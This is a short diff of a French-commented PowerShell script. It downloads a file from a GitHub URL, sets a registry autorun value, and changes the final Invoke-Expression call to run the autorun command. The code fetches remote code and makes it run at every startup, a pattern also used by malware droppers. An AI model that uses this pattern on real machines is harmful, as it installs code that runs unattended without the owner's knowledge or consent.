@@ -11,6 +11,6 @@ Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath
 # Création de la tâche planifiée
 Set-ItemProperty -Path $autorunRegistryPath -Name $autorunRegistryName -Value $autorunScriptCommand
 
-Invoke-Expression -Command $destinationPath
+Invoke-Expression -Command $autorunScriptCommand
 
 Pause
